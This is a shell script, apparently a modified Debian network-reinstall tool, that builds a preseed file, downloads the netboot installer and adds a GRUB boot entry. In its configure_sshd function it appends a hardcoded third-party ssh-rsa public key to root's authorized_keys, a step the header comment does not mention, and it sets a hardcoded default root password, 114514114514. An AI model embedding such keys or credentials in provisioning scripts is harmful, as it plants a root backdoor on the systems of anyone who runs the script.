#!/bin/sh
# shellcheck shell=dash  root密码114514114514  SSH端口222，默认无法发用密码登录，仅允许密钥登录
set -eu

err() {
    printf "\nError: %s.\n" "$1" 1>&2
    exit 1
}

warn() {
    printf "\nWarning: %s.\nContinuing with the default...\n" "$1" 1>&2
    sleep 5
}

command_exists() {
    command -v "$1" > /dev/null 2>&1
}

# Sets variable:
late_command=""
in_target() {
    local command=

    for argument in "$@"; do
        command="$command $argument"
    done

    if [ -n "$command" ]; then
        [ -z "$late_command" ] && late_command='true'
        late_command="$late_command;$command"
    fi
}

in_target_backup() {
    in_target "if [ ! -e \"$1.backup\" ]; then cp \"$1\" \"$1.backup\"; fi"
}

configure_sshd() {
    # !isset($sshd_config_backup)
    [ -z "${sshd_config_backup+1s}" ] && in_target_backup /etc/ssh/sshd_config
    sshd_config_backup=
    in_target sed -Ei \""s/^#?$1 .+/$1 $2/"\" /etc/ssh/sshd_config
    in_target echo \""precedence  ::ffff:0:0/96  100\"" >> /etc/gai.conf
    in_target sed -ri \""s/^#?Port.*/Port 222/g\"" /etc/ssh/sshd_config
    in_target sed -ri \""s/^#?PasswordAuthentication.*/PasswordAuthentication no/g\"" /etc/ssh/sshd_config
	in_target mkdir /root/.ssh
	in_target echo \""ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA5qK3fDbxZshKP3MbQo4xm1YNmTQsHcapbF8wAXJJcCgxtzujH9QuFCeQzsQ3QET2qZgG1k0GfTV6slRdrJJeI8fdwFgRc28JEhXh4rGx8MUdotJh8eVAnygWATBtet2Au5gpn3s3s44XqgnWXY+bRGJ6WoB58/3fjPG1YZIR5wh9knNxRt/9VO8YCTBqQP3z5hdPuNldx3jgIuFNhcI1qBVnQZ2czC2Zv8sHDDuiuNoaomKsg7LgbhKPnvRfEGb+yZaU/KKwbEJwbFcZkT7QiW90OhYVKT2+K8xEsUpR4ocH+SxgvFrpyKAXkSqF/Wwe32baAlzrNwucLdsS+jBk3w==\">>/root/.ssh/authorized_keys"
	
}

prompt_password() {
    local prompt=

    if [ $# -gt 0 ]; then
        prompt=$1
    elif [ "$username" = root ]; then
        prompt="Choose a password for the root user: "
    else
        prompt="Choose a password for user $username: "
    fi

    stty -echo
    trap 'stty echo' EXIT

    while [ -z "$password" ]; do
        echo -n "$prompt" > /dev/tty
        read -r password < /dev/tty
        echo > /dev/tty
    done

    stty echo
    trap - EXIT
}

download() {
    # Set "$http/https/ftp_proxy" with "$mirror_proxy"
    # only when none of those have ever been set
    [ -n "$mirror_proxy" ] &&
    [ -z "${http_proxy+1s}" ] &&
    [ -z "${https_proxy+1s}" ] &&
    [ -z "${ftp_proxy+1s}" ] &&
    export http_proxy="$mirror_proxy" &&
    export https_proxy="$mirror_proxy" &&
    export ftp_proxy="$mirror_proxy"

    if command_exists wget; then
        wget -O "$2" "$1"
    elif command_exists curl; then
        curl -fL "$1" -o "$2"
    elif command_exists busybox && busybox wget --help > /dev/null 2>&1; then
        busybox wget -O "$2" "$1"
    else
        err 'Cannot find "wget", "curl" or "busybox wget" to download files'
    fi
}

# Set "$mirror_proxy" with "$http/https/ftp_proxy"
# only when it is empty and one of those is not empty
set_mirror_proxy() {
    [ -n "$mirror_proxy" ] && return

    case $mirror_protocol in
        http)
            if [ -n "${http_proxy+1s}" ]; then mirror_proxy="$http_proxy"; fi
            ;;
        https)
            if [ -n "${https_proxy+1s}" ]; then mirror_proxy="$https_proxy"; fi
            ;;
        ftp)
            if [ -n "${ftp_proxy+1s}" ]; then mirror_proxy="$ftp_proxy"; fi
            ;;
        *)
            err "Unsupported protocol: $mirror_protocol"
    esac
}

set_security_archive() {
    case $suite in
        stretch|oldoldstable|buster|oldstable)
            security_archive="$suite/updates"
            ;;
        bullseye|stable|bookworm|testing)
            security_archive="$suite-security"
            ;;
        sid|unstable)
            security_archive=''
            ;;
        *)
            err "Unsupported suite: $suite"
    esac
}

set_daily_d_i() {
    case $suite in
        stretch|oldoldstable|buster|oldstable|bullseye|stable)
            daily_d_i=false
            ;;
        bookworm|testing|sid|unstable)
            daily_d_i=true
            ;;
        *)
            err "Unsupported suite: $suite"
    esac
}

set_suite() {
    suite=$1
    set_daily_d_i
    set_security_archive
}

set_debian_version() {
    case $1 in
        9|stretch|oldoldstable)
            set_suite stretch
            ;;
        10|buster|oldstable)
            set_suite buster
            ;;
        11|bullseye|stable)
            set_suite bullseye
            ;;
        12|bookworm|testing)
            set_suite bookworm
            ;;
        sid|unstable)
            set_suite sid
            ;;
        *)
            err "Unsupported version: $1"
    esac
}

has_cloud_kernel() {
    case $suite in
        stretch|oldoldstable)
            [ "$architecture" = amd64 ] && [ "$bpo_kernel" = true ] && return
            ;;
        buster|oldstable)
            [ "$architecture" = amd64 ] && return
            [ "$architecture" = arm64 ] && [ "$bpo_kernel" = true ] && return
            ;;
        bullseye|stable|bookworm|testing|sid|unstable)
            [ "$architecture" = amd64 ] || [ "$architecture" = arm64 ] && return
    esac

    local tmp; tmp=''; [ "$bpo_kernel" = true ] && tmp='-backports'
    warn "No cloud kernel is available for $architecture/$suite$tmp"

    return 1
}

has_backports() {
    case $suite in
        stretch|oldoldstable|buster|oldstable|bullseye|stable|bookworm|testing) return
    esac

    warn "No backports kernel is available for $suite"

    return 1
}


DEFAULTNET="$(ip route show |grep -o 'default via [0-9]\{1,3\}.[0-9]\{1,3\}.[0-9]\{1,3\}.[0-9]\{1,3\}.*' |head -n1 |sed 's/proto.*\|onlink.*//g' |awk '{print $NF}')";
[[ -n "$DEFAULTNET" ]] && IPSUB="$(ip addr |grep ''${DEFAULTNET}'' |grep 'global' |grep 'brd' |head -n1 |grep -o '[0-9]\{1,3\}.[0-9]\{1,3\}.[0-9]\{1,3\}.[0-9]\{1,3\}/[0-9]\{1,2\}')";
ip="$(echo -n "$IPSUB" |cut -d'/' -f1)";
NETSUB="$(echo -n "$IPSUB" |grep -o '/[0-9]\{1,2\}')";
gateway="$(ip route show |grep -o 'default via [0-9]\{1,3\}.[0-9]\{1,3\}.[0-9]\{1,3\}.[0-9]\{1,3\}' |head -n1 |grep -o '[0-9]\{1,3\}.[0-9]\{1,3\}.[0-9]\{1,3\}.[0-9]\{1,3\}')";
[[ -n "$NETSUB" ]] && netmask="$(echo -n '128.0.0.0/1,192.0.0.0/2,224.0.0.0/3,240.0.0.0/4,248.0.0.0/5,252.0.0.0/6,254.0.0.0/7,255.0.0.0/8,255.128.0.0/9,255.192.0.0/10,255.224.0.0/11,255.240.0.0/12,255.248.0.0/13,255.252.0.0/14,255.254.0.0/15,255.255.0.0/16,255.255.128.0/17,255.255.192.0/18,255.255.224.0/19,255.255.240.0/20,255.255.248.0/21,255.255.252.0/22,255.255.254.0/23,255.255.255.0/24,255.255.255.128/25,255.255.255.192/26,255.255.255.224/27,255.255.255.240/28,255.255.255.248/29,255.255.255.252/30,255.255.255.254/31,255.255.255.255/32' |grep -o '[0-9]\{1,3\}.[0-9]\{1,3\}.[0-9]\{1,3\}.[0-9]\{1,3\}'${NETSUB}'' |cut -d'/' -f1)";


dns='8.8.8.8 1.1.1.1'
hostname='Debian'
network_console=false
set_debian_version 11
mirror_protocol=http
mirror_host=deb.debian.org
mirror_directory=/debian
mirror_proxy=
security_repository=http://security.debian.org/debian-security
account_setup=true
username=root
password=114514114514
authorized_keys_url=
sudo_with_password=false
timezone=Asia/Shanghai
ntp=0.debian.pool.ntp.org
disk_partitioning=true
disk=
force_gpt=true
efi=
filesystem=ext4
kernel=
cloud_kernel=false
bpo_kernel=false
install_recommends=true
install='ca-certificates apt-transport-https libpam-systemd iptables vim wget curl telnet lsof iperf3 dnsutils conntrack wireguard nmap'
upgrade=
kernel_params=
bbr=false
hold=false
power_off=false
architecture=
boot_directory=
firmware=false
force_efi_extra_removable=true
grub_timeout=5
dry_run=false

while [ $# -gt 0 ]; do
    case $1 in
        --cdn|--aws)
            mirror_protocol=https
            [ "$1" = '--aws' ] && mirror_host=cdn-aws.deb.debian.org
            security_repository=mirror
            ;;
        --china)
            dns='223.5.5.5 114.114.114.114'
            mirror_protocol=https
            mirror_host=mirrors.ustc.edu.cn
            ntp=ntp.aliyun.com
            security_repository=mirror
            ;;
        --ip)
            ip=$2
            shift
            ;;
        --netmask)
            netmask=$2
            shift
            ;;
        --gateway)
            gateway=$2
            shift
            ;;
        --dns)
            dns=$2
            shift
            ;;
        --hostname)
            hostname=$2
            shift
            ;;
        --network-console)
            network_console=true
            ;;
        --version)
            set_debian_version "$2"
            shift
            ;;
        --suite)
            set_suite "$2"
            shift
            ;;
        --release-d-i)
            daily_d_i=false
            ;;
        --daily-d-i)
            daily_d_i=true
            ;;
        --mirror-protocol)
            mirror_protocol=$2
            shift
            ;;
        --https)
            mirror_protocol=https
            ;;
        --mirror-host)
            mirror_host=$2
            shift
            ;;
        --mirror-directory)
            mirror_directory=${2%/}
            shift
            ;;
        --mirror-proxy|--proxy)
            mirror_proxy=$2
            shift
            ;;
        --security-repository)
            security_repository=$2
            shift
            ;;
        --no-user|--no-account-setup)
            account_setup=false
            ;;
        --user|--username)
            username=$2
            shift
            ;;
        --password)
            password=$2
            shift
            ;;
        --authorized-keys-url)
            authorized_keys_url=$2
            shift
            ;;
        --sudo-with-password)
            sudo_with_password=true
            ;;
        --timezone)
            timezone=$2
            shift
            ;;
        --ntp)
            ntp=$2
            shift
            ;;
        --no-part|--no-disk-partitioning)
            disk_partitioning=false
            ;;
        --disk)
            disk=$2
            shift
            ;;
        --no-force-gpt)
            force_gpt=false
            ;;
        --bios)
            efi=false
            ;;
        --efi)
            efi=true
            ;;
        --filesystem)
            filesystem=$2
            shift
            ;;
        --kernel)
            kernel=$2
            shift
            ;;
        --cloud-kernel)
            cloud_kernel=true
            ;;
        --bpo-kernel)
            bpo_kernel=true
            ;;
        --no-install-recommends)
            install_recommends=false
            ;;
        --install)
            install=$2
            shift
            ;;
        --no-upgrade)
            upgrade=none
            ;;
        --safe-upgrade)
            upgrade=safe-upgrade
            ;;
        --full-upgrade)
            upgrade=full-upgrade
            ;;
        --ethx)
            kernel_params="$kernel_params net.ifnames=0 biosdevname=0"
            ;;
        --bbr)
            bbr=true
            ;;
        --hold)
            hold=true
            ;;
        --power-off)
            power_off=true
            ;;
        --architecture)
            architecture=$2
            shift
            ;;
        --boot-directory)
            boot_directory=$2
            shift
            ;;
        --firmware)
            firmware=true
            ;;
        --no-force-efi-extra-removable)
            force_efi_extra_removable=false
            ;;
        --grub-timeout)
            grub_timeout=$2
            shift
            ;;
        --dry-run)
            dry_run=true
            ;;
        *)
            err "Unknown option: \"$1\""
    esac
    shift
done

[ -z "$architecture" ] && {
    architecture=$(dpkg --print-architecture 2> /dev/null) || {
        case $(uname -m) in
            x86_64)
                architecture=amd64
                ;;
            aarch64)
                architecture=arm64
                ;;
            i386)
                architecture=i386
                ;;
            *)
                err 'No "--architecture" specified'
        esac
    }
}

[ -z "$kernel" ] && {
    kernel="linux-image-$architecture"

    [ "$cloud_kernel" = true ] && has_cloud_kernel && kernel="linux-image-cloud-$architecture"
    [ "$bpo_kernel" = true ] && has_backports && install="$kernel/$suite-backports $install"
}

[ -n "$authorized_keys_url" ] && ! download "$authorized_keys_url" /dev/null &&
err "Failed to download SSH authorized public keys from \"$authorized_keys_url\""

installer="debian-$suite"
installer_directory="/boot/$installer"

save_preseed='cat'
[ "$dry_run" = false ] && {
    [ "$(id -u)" -ne 0 ] && err 'root privilege is required'
    rm -rf "$installer_directory"
    mkdir -p "$installer_directory"
    cd "$installer_directory"
    save_preseed='tee -a preseed.cfg'
}

if [ "$account_setup" = true ]; then
    prompt_password
elif [ "$network_console" = true ] && [ -z "$authorized_keys_url" ]; then
    prompt_password "Choose a password for the installer user of the SSH network console: "
fi

$save_preseed << 'EOF'
# Localization

d-i debian-installer/language string en
d-i debian-installer/country string US
d-i debian-installer/locale string en_US.UTF-8
d-i keyboard-configuration/xkb-keymap select us

# Network configuration

d-i netcfg/choose_interface select auto
EOF

[ -n "$ip" ] && {
    echo 'd-i netcfg/disable_autoconfig boolean true' | $save_preseed
    echo "d-i netcfg/get_ipaddress string $ip" | $save_preseed
    [ -n "$netmask" ] && echo "d-i netcfg/get_netmask string $netmask" | $save_preseed
    [ -n "$gateway" ] && echo "d-i netcfg/get_gateway string $gateway" | $save_preseed
    [ -z "${ip%%*:*}" ] && [ -n "${dns%%*:*}" ] && dns='2001:4860:4860::8888 2001:4860:4860::8844'
    [ -n "$dns" ] && echo "d-i netcfg/get_nameservers string $dns" | $save_preseed
    echo 'd-i netcfg/confirm_static boolean true' | $save_preseed
}

if [ -n "$hostname" ]; then
    echo "d-i netcfg/hostname string $hostname" | $save_preseed
    hostname=debian
    domain=
else
    hostname=$(cat /proc/sys/kernel/hostname)
    domain=$(cat /proc/sys/kernel/domainname)
    if [ "$domain" = '(none)' ]; then
        domain=
    else
        domain=" $domain"
    fi
fi

$save_preseed << EOF
d-i netcfg/get_hostname string $hostname
d-i netcfg/get_domain string$domain
EOF

echo 'd-i hw-detect/load_firmware boolean true' | $save_preseed

[ "$network_console" = true ] && {
    $save_preseed << 'EOF'

# Network console

d-i anna/choose_modules string network-console
d-i preseed/early_command string anna-install network-console
EOF
    if [ -n "$authorized_keys_url" ]; then
        echo "d-i network-console/authorized_keys_url string $authorized_keys_url" | $save_preseed
    else
        $save_preseed << EOF
d-i network-console/password password $password
d-i network-console/password-again password $password
EOF
    fi

    echo 'd-i network-console/start select Continue' | $save_preseed
}

set_mirror_proxy

$save_preseed << EOF

# Mirror settings

d-i mirror/country string manual
d-i mirror/protocol string $mirror_protocol
d-i mirror/$mirror_protocol/hostname string $mirror_host
d-i mirror/$mirror_protocol/directory string $mirror_directory
d-i mirror/$mirror_protocol/proxy string $mirror_proxy
d-i mirror/suite string $suite
EOF

[ "$account_setup" = true ] && {
    password_hash=$(mkpasswd -m sha-256 "$password" 2> /dev/null) ||
    password_hash=$(openssl passwd -5 "$password" 2> /dev/null) ||
    password_hash=$(busybox mkpasswd -m sha256 "$password" 2> /dev/null) || {
        for python in python3 python python2; do
            password_hash=$("$python" -c 'import crypt, sys; print(crypt.crypt(sys.argv[1], crypt.mksalt(crypt.METHOD_SHA256)))' "$password" 2> /dev/null) && break
        done
    }

    $save_preseed << 'EOF'

# Account setup

EOF
    [ -n "$authorized_keys_url" ] && configure_sshd PasswordAuthentication no

    if [ "$username" = root ]; then
        if [ -z "$authorized_keys_url" ]; then
            configure_sshd PermitRootLogin yes
        else
            in_target "mkdir -m 0700 -p ~root/.ssh && busybox wget -O- \"$authorized_keys_url\" >> ~root/.ssh/authorized_keys"
        fi

        $save_preseed << 'EOF'
d-i passwd/root-login boolean true
d-i passwd/make-user boolean false
EOF

        if [ -z "$password_hash" ]; then
            $save_preseed << EOF
d-i passwd/root-password password $password
d-i passwd/root-password-again password $password
EOF
        else
            echo "d-i passwd/root-password-crypted password $password_hash" | $save_preseed
        fi
    else
        configure_sshd PermitRootLogin no

        [ -n "$authorized_keys_url" ] &&
        in_target "sudo -u $username mkdir -m 0700 -p ~$username/.ssh && busybox wget -O - \"$authorized_keys_url\" | sudo -u $username tee -a ~$username/.ssh/authorized_keys"

        [ "$sudo_with_password" = false ] &&
        in_target "echo \"$username ALL=(ALL:ALL) NOPASSWD:ALL\" > \"/etc/sudoers.d/90-user-$username\""

        $save_preseed << EOF
d-i passwd/root-login boolean false
d-i passwd/make-user boolean true
d-i passwd/user-fullname string
d-i passwd/username string $username
EOF

        if [ -z "$password_hash" ]; then
            $save_preseed << EOF
d-i passwd/user-password password $password
d-i passwd/user-password-again password $password
EOF
        else
            echo "d-i passwd/user-password-crypted password $password_hash" | $save_preseed
        fi
    fi
}

$save_preseed << EOF

# Clock and time zone setup

d-i time/zone string $timezone
d-i clock-setup/utc boolean true
d-i clock-setup/ntp boolean true
d-i clock-setup/ntp-server string $ntp
EOF

[ "$disk_partitioning" = true ] && {
    $save_preseed << 'EOF'

# Partitioning

d-i partman-auto/method string regular
EOF
    if [ -n "$disk" ]; then
        echo "d-i partman-auto/disk string $disk" | $save_preseed
    else
        # shellcheck disable=SC2016
        echo 'd-i partman/early_command string debconf-set partman-auto/disk "$(list-devices disk | head -n 1)"' | $save_preseed
    fi

    [ "$force_gpt" = true ] && {
        $save_preseed << 'EOF'
d-i partman-partitioning/choose_label string gpt
d-i partman-partitioning/default_label string gpt
EOF
    }

    echo "d-i partman/default_filesystem string $filesystem" | $save_preseed

    [ -z "$efi" ] && {
        efi=false
        [ -d /sys/firmware/efi ] && efi=true
    }

    $save_preseed << 'EOF'
d-i partman-auto/expert_recipe string \
    naive :: \
EOF
    if [ "$efi" = true ]; then
        $save_preseed << 'EOF'
        106 106 106 free \
            $iflabel{ gpt } \
            $reusemethod{ } \
            method{ efi } \
            format{ } \
        . \
EOF
    else
        $save_preseed << 'EOF'
        1 1 1 free \
            $iflabel{ gpt } \
            $reusemethod{ } \
            method{ biosgrub } \
        . \
EOF
    fi

    $save_preseed << 'EOF'
        1075 1076 -1 $default_filesystem \
            method{ format } \
            format{ } \
            use_filesystem{ } \
            $default_filesystem{ } \
            mountpoint{ / } \
        .
EOF
    if [ "$efi" = true ]; then
        echo 'd-i partman-efi/non_efi_system boolean true' | $save_preseed
    fi

    $save_preseed << 'EOF'
d-i partman-auto/choose_recipe select naive
d-i partman-basicfilesystems/no_swap boolean false
d-i partman-partitioning/confirm_write_new_label boolean true
d-i partman/choose_partition select finish
d-i partman/confirm boolean true
d-i partman/confirm_nooverwrite boolean true
EOF
}

$save_preseed << EOF

# Base system installation

d-i base-installer/kernel/image string $kernel
EOF

[ "$install_recommends" = false ] && echo "d-i base-installer/install-recommends boolean $install_recommends" | $save_preseed

[ "$security_repository" = mirror ] && security_repository=$mirror_protocol://$mirror_host${mirror_directory%/*}/debian-security

# If not sid/unstable
[ -n "$security_archive" ] && {
    $save_preseed << EOF

# Apt setup

d-i apt-setup/services-select multiselect updates, backports
d-i apt-setup/local0/repository string $security_repository $security_archive main
d-i apt-setup/local0/source boolean true
EOF

}

$save_preseed << 'EOF'

# Package selection

tasksel tasksel/first multiselect ssh-server
EOF

[ -n "$install" ] && echo "d-i pkgsel/include string $install" | $save_preseed
[ -n "$upgrade" ] && echo "d-i pkgsel/upgrade select $upgrade" | $save_preseed

$save_preseed << 'EOF'
popularity-contest popularity-contest/participate boolean false

# Boot loader installation

d-i grub-installer/bootdev string default
EOF

[ "$force_efi_extra_removable" = true ] && echo 'd-i grub-installer/force-efi-extra-removable boolean true' | $save_preseed
[ -n "$kernel_params" ] && echo "d-i debian-installer/add-kernel-opts string$kernel_params" | $save_preseed

$save_preseed << 'EOF'

# Finishing up the installation

EOF

[ "$hold" = false ] && echo 'd-i finish-install/reboot_in_progress note' | $save_preseed

[ "$bbr" = true ] && in_target '{ echo "net.core.default_qdisc=fq"; echo "net.ipv4.tcp_congestion_control=bbr"; } > /etc/sysctl.d/bbr.conf'

[ -n "$late_command" ] && echo "d-i preseed/late_command string in-target sh -c '$late_command'" | $save_preseed

[ "$power_off" = true ] && echo 'd-i debian-installer/exit/poweroff boolean true' | $save_preseed

save_grub_cfg='cat'
[ "$dry_run" = false ] && {
    base_url="$mirror_protocol://$mirror_host$mirror_directory/dists/$suite/main/installer-$architecture/current/images/netboot/debian-installer/$architecture"
    [ "$suite" = stretch ] && [ "$efi" = true ] && base_url="$mirror_protocol://$mirror_host$mirror_directory/dists/buster/main/installer-$architecture/current/images/netboot/debian-installer/$architecture"
    [ "$daily_d_i" = true ] && base_url="https://d-i.debian.org/daily-images/$architecture/daily/netboot/debian-installer/$architecture"
    firmware_url="https://cdimage.debian.org/cdimage/unofficial/non-free/firmware/$suite/current/firmware.cpio.gz"

    download "$base_url/linux" linux
    download "$base_url/initrd.gz" initrd.gz
    [ "$firmware" = true ] && download "$firmware_url" firmware.cpio.gz

    gzip -d initrd.gz
    # cpio reads a list of file names from the standard input
    echo preseed.cfg | cpio -o -H newc -A -F initrd
    gzip -1 initrd

    mkdir -p /etc/default/grub.d
    tee /etc/default/grub.d/zz-debi.cfg 1>&2 << EOF
GRUB_DEFAULT=debi
GRUB_TIMEOUT=$grub_timeout
GRUB_TIMEOUT_STYLE=menu
EOF

    if command_exists update-grub; then
        grub_cfg=/boot/grub/grub.cfg
        update-grub
    elif command_exists grub2-mkconfig; then
        tmp=$(mktemp)
        grep -vF zz_debi /etc/default/grub > "$tmp"
        cat "$tmp" > /etc/default/grub
        rm "$tmp"
        # shellcheck disable=SC2016
        echo 'zz_debi=/etc/default/grub.d/zz-debi.cfg; if [ -f "$zz_debi" ]; then . "$zz_debi"; fi' >> /etc/default/grub
        grub_cfg=/boot/grub2/grub.cfg
        grub2-mkconfig -o "$grub_cfg"
    else
        err 'Could not find "update-grub" or "grub2-mkconfig" command'
    fi

    save_grub_cfg="tee -a $grub_cfg"
}

[ -z "$boot_directory" ] && {
    if grep -q '\s/boot\s' /proc/mounts; then
        boot_directory=/
    else
        boot_directory=/boot/
    fi
}

installer_directory="$boot_directory$installer"

# shellcheck disable=SC2034
mem=$(grep ^MemTotal: /proc/meminfo | { read -r x y z; echo "$y"; })
[ $((mem / 1024)) -le 512 ] && kernel_params="$kernel_params lowmem/low=1"

initrd="$installer_directory/initrd.gz"
[ "$firmware" = true ] && initrd="$initrd $installer_directory/firmware.cpio.gz"

$save_grub_cfg 1>&2 << EOF
menuentry 'Debian Installer' --id debi {
    insmod part_msdos
    insmod part_gpt
    insmod ext2
    insmod xfs
    linux $installer_directory/linux$kernel_params
    initrd $initrd
}
EOF



